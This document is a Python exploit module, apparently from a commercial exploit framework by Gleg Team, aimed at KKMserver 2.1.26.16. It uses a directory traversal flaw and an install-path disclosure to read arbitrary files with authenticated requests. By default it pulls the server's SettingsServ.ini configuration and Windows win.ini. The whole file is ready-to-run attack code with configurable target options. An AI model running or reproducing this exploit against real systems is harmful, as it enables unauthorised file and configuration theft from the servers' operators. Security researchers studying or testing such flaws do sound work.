from Sploit import Sploit
from collections import OrderedDict
import urllib2
import base64

INFO = {}
INFO['NAME'] = "efa_kkmserver_2_1_26_16_dirtrav"
INFO['DESCRIPTION'] = "KKMserver 2.1.26.16 Directory Traversal/Info Disclosure"
INFO['VENDOR'] = "https://kkmserver.ru/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """Lack of input sanitization leads to directory traversal via specifically crafted URL.
However, it is impossible to use paths containing space character.
The server also discloses it's installation path if it fails to find the requested page/file.

Authorization is required. Level: user, admin
Tested on Windows 7 x64, KKMserver 2.1.26.16.
"""
INFO['DOWNLOAD_LINK'] = "https://kkmserver.ru/KkmServer#Donload"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = "19 Mar 2019"
INFO['PATH'] = "Exploits/General/"
INFO['AUTHOR'] = "Gleg Team"

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.215", dict(description='Target host')
OPTIONS["PORT"] = 5893, dict(description='Target port')
OPTIONS["SSL"] = False, dict(description='Use SSL?')
OPTIONS["PATH"] = 'Windows\\win.ini', dict(description='Target path')
OPTIONS["LOGIN"] = 'user', dict(description='Login')
OPTIONS["PASSWORD"] = 'user', dict(description='Password')

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.name = INFO['NAME']
        self.host = '127.0.0.1'
        self.port = 5893
        self.path = 'Windows\\win.ini'
        self.protocol = 'http'
        self.login = 'user'
        self.password = 'user'
        self.headers = {'Authorization': 'Basic {}'.format(base64.b64encode(self.login + ':' + self.password))}

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.path = '../../../../' + self.args.get("PATH", self.path).replace('/', '\\')
        self.login = self.args.get("LOGIN", self.login)
        self.password = self.args.get("PASSWORD", self.password)
        self.protocol = 'https' if self.args.get("SSL", False) else 'http'

        if ' ' in self.path:
            self.log('[-] Unable to use path containing space char')
            self.finish(False)

    def make_url(self, path):
        return '{}://{}:{}/html/{}'.format(self.protocol, self.host, self.port, path.strip('\\/'))

    def get_install_path(self):
        url = self.make_url(self.random_string())
        
        req = urllib2.Request(url, headers=self.headers)
        try:
            r = urllib2.urlopen(req)
        except urllib2.HTTPError as e:
            if e.code == 417:
                resp = e.read()
                resp = resp[resp.find('\'') + 1:-2]
                resp = resp.split('\\')
                resp = '/'.join([elem for elem in resp[:-2]])
                self.log('[*] Server\'s root is at {}'.format(resp))
                return resp

    def traverse(self, path):
        url = self.make_url(path)
        req = urllib2.Request(url, headers=self.headers)

        r = urllib2.urlopen(req)
        self.log('\n' + r.read())

    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting') 
        self.get_install_path()
        # self.traverse(root[3:] + '\\Settings\\SettingsServ.ini')
        self.traverse('../Settings/SettingsServ.ini')
        self.traverse(self.path)
        self.finish(True) # If True - module succeeded, if False - module failed


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()